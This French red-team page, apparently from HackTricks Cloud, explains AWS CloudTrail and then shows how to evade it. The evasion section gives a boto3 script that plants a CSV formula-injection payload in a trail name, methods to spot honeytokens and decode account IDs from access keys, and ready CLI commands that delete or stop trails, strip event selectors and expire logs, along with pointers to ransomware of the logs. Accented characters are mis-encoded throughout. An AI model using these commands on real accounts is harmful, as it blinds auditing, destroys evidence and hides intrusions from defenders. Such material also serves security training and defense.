# AWS - CloudTrail Enum

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **CloudTrail**

AWS CloudTrail **enregistre et surveille l'activit√© au sein de votre environnement AWS**. Il capture des **journaux d'√©v√©nements d√©taill√©s**, y compris qui a fait quoi, quand et d'o√π, pour toutes les interactions avec les ressources AWS. Cela fournit une piste d'audit des changements et des actions, aidant dans l'analyse de la s√©curit√©, l'audit de conformit√© et le suivi des changements de ressources. CloudTrail est essentiel pour comprendre le comportement des utilisateurs et des ressources, am√©liorer les postures de s√©curit√© et garantir la conformit√© r√©glementaire.

Chaque √©v√©nement enregistr√© contient :

* Le nom de l'API appel√©e : `eventName`
* Le service appel√© : `eventSource`
* L'heure : `eventTime`
* L'adresse IP : `SourceIPAddress`
* La m√©thode de l'agent : `userAgent`. Exemples :
  * Signing.amazonaws.com - Depuis la console de gestion AWS
  * console.amazonaws.com - Utilisateur root du compte
  * lambda.amazonaws.com - AWS Lambda
* Les param√®tres de la requ√™te : `requestParameters`
* Les √©l√©ments de r√©ponse : `responseElements`

Les √©v√©nements sont √©crits dans un nouveau fichier journal **environ toutes les 5 minutes dans un fichier JSON**, ils sont conserv√©s par CloudTrail et enfin, les fichiers journaux sont **livr√©s √† S3 environ 15 minutes apr√®s**.\
Les journaux CloudTrail peuvent √™tre **agr√©g√©s √† travers des comptes et des r√©gions**.\
CloudTrail permet d'utiliser **l'int√©grit√© des fichiers journaux afin de pouvoir v√©rifier que vos fichiers journaux sont rest√©s inchang√©s** depuis que CloudTrail les a livr√©s. Il cr√©e un hachage SHA-256 des journaux dans un fichier de synth√®se. Un hachage sha-256 des nouveaux journaux est cr√©√© toutes les heures.\
Lors de la cr√©ation d'un Trail, les s√©lecteurs d'√©v√©nements vous permettront d'indiquer au trail de consigner : les √©v√©nements de gestion, de donn√©es ou d'insights.

Les journaux sont sauvegard√©s dans un seau S3. Par d√©faut, le chiffrement c√¥t√© serveur est utilis√© (SSE-S3) donc AWS d√©chiffrera le contenu pour les personnes qui y ont acc√®s, mais pour une s√©curit√© suppl√©mentaire, vous pouvez utiliser SSE avec KMS et vos propres cl√©s.

Les journaux sont stock√©s dans un **seau S3 avec ce format de nom** :

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYYY/MM/DD`**
* √âtant le BucketName : **`aws-cloudtrail-logs-<accountid>-<random>`**
* Exemple : **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

√Ä l'int√©rieur de chaque dossier, chaque journal aura un **nom suivant ce format** : **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Convention de nommage des fichiers journaux

![](<../../../../.gitbook/assets/image (29).png>)

De plus, **les fichiers de synth√®se (pour v√©rifier l'int√©grit√© des fichiers)** seront √† l'int√©rieur du **m√™me seau** dans :

![](<../../../../.gitbook/assets/image (22).png>)

### Agr√©ger les journaux de plusieurs comptes

* Cr√©ez un Trail dans le compte AWS o√π vous souhaitez que les fichiers journaux soient livr√©s
* Appliquez des permissions au seau S3 de destination permettant l'acc√®s inter-comptes pour CloudTrail et autorisez chaque compte AWS qui en a besoin
* Cr√©ez un nouveau Trail dans les autres comptes AWS et s√©lectionnez d'utiliser le seau cr√©√© √† l'√©tape 1

Cependant, m√™me si vous pouvez sauvegarder tous les journaux dans le m√™me seau S3, vous ne pouvez pas agr√©ger les journaux CloudTrail de plusieurs comptes dans un CloudWatch Logs appartenant √† un seul compte AWS.

{% hint style="danger" %}
Rappelez-vous qu'un compte peut avoir **diff√©rents Trails** de CloudTrail **activ√©s** stockant les m√™mes (ou diff√©rents) journaux dans diff√©rents seaux.
{% endhint %}

### Cloudtrail de tous les comptes de l'org dans 1

Lors de la cr√©ation d'un CloudTrail, il est possible d'indiquer d'activer cloudtrail pour tous les comptes de l'org et de recevoir les journaux dans juste 1 seau :

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

De cette mani√®re, vous pouvez facilement configurer CloudTrail dans toutes les r√©gions de tous les comptes et centraliser les journaux dans 1 compte (que vous devriez prot√©ger).

### V√©rification des fichiers journaux

Vous pouvez v√©rifier que les journaux n'ont pas √©t√© alt√©r√©s en ex√©cutant

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
### Journaux vers CloudWatch

**CloudTrail peut envoyer automatiquement les journaux √† CloudWatch afin que vous puissiez configurer des alertes qui vous avertissent lorsque des activit√©s suspectes sont effectu√©es.**\
Notez que pour permettre √† CloudTrail d'envoyer les journaux √† CloudWatch, un **r√¥le** doit √™tre cr√©√© pour autoriser cette action. Si possible, il est recommand√© d'utiliser le r√¥le par d√©faut d'AWS pour effectuer ces actions. Ce r√¥le permettra √† CloudTrail de :

* CreateLogStream : Cela permet de cr√©er des flux de journaux CloudWatch Logs
* PutLogEvents : Livrer les journaux CloudTrail au flux de journaux CloudWatch Logs

### Historique des √©v√©nements

L'historique des √©v√©nements CloudTrail vous permet d'inspecter dans un tableau les journaux qui ont √©t√© enregistr√©s :

![](<../../../../.gitbook/assets/image (24).png>)

### Insights

**CloudTrail Insights** analyse automatiquement les √©v√©nements de gestion en √©criture de CloudTrail et vous **alerte** sur les **activit√©s inhabituelles**. Par exemple, si une augmentation des √©v√©nements `TerminateInstance` diff√®re des bases √©tablies, vous le verrez comme un √©v√©nement Insight. Ces √©v√©nements rendent **la recherche et la r√©ponse √† une activit√© API inhabituelle plus faciles** que jamais.

Les insights sont stock√©s dans le m√™me compartiment que les journaux CloudTrail dans : `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### S√©curit√©

| Int√©grit√© des fichiers journaux CloudTrail | <ul><li>Valider si les journaux ont √©t√© alt√©r√©s (modifi√©s ou supprim√©s)</li><li><p>Utilise des fichiers de digest (cr√©er un hash pour chaque fichier)</p><ul><li>Hashage SHA-256</li><li>SHA-256 avec RSA pour la signature num√©rique</li><li>cl√© priv√©e d√©tenue par Amazon</li></ul></li><li>Prend 1 heure pour cr√©er un fichier de digest (fait √† chaque heure)</li></ul> |
| ------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Arr√™ter l'acc√®s non autoris√©               | <ul><li><p>Utiliser des politiques IAM et des politiques de compartiment S3</p><ul><li>√©quipe de s√©curit√© ‚Äî> acc√®s admin</li><li>auditeurs ‚Äî> acc√®s en lecture seule</li></ul></li><li>Utiliser SSE-S3/SSE-KMS pour chiffrer les journaux</li></ul>                                                                                                   |
| Emp√™cher la suppression des fichiers journaux | <ul><li>Restreindre l'acc√®s de suppression avec IAM et les politiques de compartiment</li><li>Configurer la suppression MFA S3</li><li>Valider avec la Validation de Fichier Journal</li></ul>                                                                                                                                               |

## Access Advisor

AWS Access Advisor s'appuie sur les derniers 400 jours de journaux **CloudTrail pour recueillir ses insights**. CloudTrail capture un historique des appels d'API AWS et des √©v√©nements associ√©s effectu√©s dans un compte AWS. Access Advisor utilise ces donn√©es pour **montrer quand les services ont √©t√© derni√®rement acc√©d√©s**. En analysant les journaux CloudTrail, Access Advisor peut d√©terminer quels services AWS un utilisateur ou un r√¥le IAM a acc√©d√©s et quand cet acc√®s a eu lieu. Cela aide les administrateurs AWS √† prendre des d√©cisions √©clair√©es sur **l'affinement des permissions**, car ils peuvent identifier les services qui n'ont pas √©t√© acc√©d√©s pendant de longues p√©riodes et potentiellement r√©duire les permissions trop larges bas√©es sur des mod√®les d'utilisation r√©els.

{% hint style="success" %}
Ainsi, Access Advisor informe sur **les permissions inutiles accord√©es aux utilisateurs** afin que l'administrateur puisse les supprimer.
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Actions

### √ânum√©ration
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **Injection CSV**

Il est possible de r√©aliser une injection CSV dans CloudTrail qui ex√©cutera du code arbitraire si les logs sont export√©s en CSV et ouverts avec Excel.\
Le code suivant g√©n√©rera une entr√©e de log avec un mauvais nom de Trail contenant le payload :
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Pour plus d'informations sur les injections CSV, consultez la page :

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Pour plus d'informations sur cette technique sp√©cifique, consultez [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Contournement de la D√©tection**

### Contournement des **HoneyTokens**

Les HoneyTokens sont cr√©√©s pour **d√©tecter l'exfiltration d'informations sensibles**. Dans le cas d'AWS, il s'agit de **cl√©s AWS dont l'utilisation est surveill√©e** ; si quelque chose d√©clenche une action avec cette cl√©, alors quelqu'un a d√ª voler cette cl√©.

Cependant, cette surveillance est effectu√©e via **CloudTrail**, et il existe certains **services AWS qui n'envoient pas de journaux √† CloudTrail** (trouvez la [liste ici](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Certains de ces services vont **r√©pondre** avec une **erreur** contenant l'**ARN du r√¥le de la cl√©** si quelqu'un de non autoris√© (la cl√© honeytoken) essaie d'y acc√©der.

De cette mani√®re, un **attaquant peut obtenir l'ARN de la cl√© sans d√©clencher de journal**. Dans l'ARN, l'attaquant peut voir l'**ID du compte AWS et le nom** ; il est facile de conna√Ætre les ID et noms des comptes des entreprises HoneyToken, donc de cette fa√ßon un attaquant peut identifier si le token est un HoneyToken.

![](<../../../../.gitbook/assets/image (65).png>)

#### **D√©tection des HoneyTokens**

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) d√©tecte si une cl√© appartient √† [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)** :**

* Si **`canarytokens.org`** appara√Æt dans le nom du r√¥le ou si l'ID du compte **`534261010715`** appara√Æt dans le message d'erreur.
* En les testant plus r√©cemment, ils utilisent le compte **`717712589309`** et ont toujours la cha√Æne **`canarytokens.com`** dans le nom.
* Si **`SpaceCrab`** appara√Æt dans le nom du r√¥le dans le message d'erreur
* **SpaceSiren** utilise des **uuids** pour g√©n√©rer des noms d'utilisateur : `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* Si le **nom semble g√©n√©r√© al√©atoirement**, il y a de fortes probabilit√©s que ce soit un HoneyToken.

{% hint style="danger" %}
Notez que toutes les API publiques d√©couvertes pour ne pas cr√©er de journaux CloudTrail sont maintenant corrig√©es, donc peut-√™tre que vous devrez trouver les v√¥tres...

Ou vous pouvez obtenir l'**ID du compte** √† partir de l'**encodage** √† l'int√©rieur de la **cl√© d'acc√®s** comme [**expliqu√© ici**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) et v√©rifier l'ID du compte avec votre liste de comptes AWS Honeytokens :
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print ("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
{% endhint %}

Pour plus d'informations, consultez la [**recherche originale**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).

### Acc√©der √† une infrastructure tierce

Certains services AWS vont **g√©n√©rer de l'infrastructure** telle que des **Bases de donn√©es** ou des clusters **Kubernetes** (EKS). Un utilisateur **communiquant directement avec ces services** (comme l'API Kubernetes) **n'utilisera pas l'API AWS**, donc CloudTrail ne pourra pas voir cette communication.

Par cons√©quent, un utilisateur ayant acc√®s √† EKS qui a d√©couvert l'URL de l'API EKS pourrait g√©n√©rer un jeton localement et **parler directement au service API sans √™tre d√©tect√© par Cloudtrail**.

Plus d'infos dans :

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### Modifier la configuration de CloudTrail

#### Supprimer des trails
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Arr√™ter les trails
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### D√©sactiver la journalisation multi-r√©gion

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### D√©sactiver la journalisation par s√©lecteurs d'√©v√©nements

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

Dans le premier exemple, un seul s√©lecteur d'√©v√©nement est fourni sous forme de tableau JSON avec un seul objet. `"ReadWriteType": "ReadOnly"` indique que **le s√©lecteur d'√©v√©nement doit uniquement capturer les √©v√©nements en lecture seule** (ainsi, CloudTrail insights **ne v√©rifiera pas les √©v√©nements d'√©criture** par exemple).

Vous pouvez personnaliser le s√©lecteur d'√©v√©nement en fonction de vos besoins sp√©cifiques.

#### Suppression des logs via la politique de cycle de vie S3

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Modification de la configuration du Bucket

* Supprimer le bucket S3
* Changer la politique du bucket pour refuser tout √©criture du service CloudTrail
* Ajouter une politique de cycle de vie au bucket S3 pour supprimer les objets
* D√©sactiver la cl√© KMS utilis√©e pour chiffrer les logs CloudTrail

### Ransomware Cloudtrail

#### Ransomware S3

Vous pourriez **g√©n√©rer une cl√© asym√©trique** et faire en sorte que **CloudTrail chiffre les donn√©es** avec cette cl√© puis **supprimer la cl√© priv√©e** de sorte que le contenu de CloudTrail ne puisse pas √™tre r√©cup√©r√©.\
C'est essentiellement un **ransomware S3-KMS** expliqu√© dans :

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**Ransomware KMS**

C'est une mani√®re plus simple de r√©aliser l'attaque pr√©c√©dente avec des exigences de permissions diff√©rentes :

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **R√©f√©rences**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> !</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
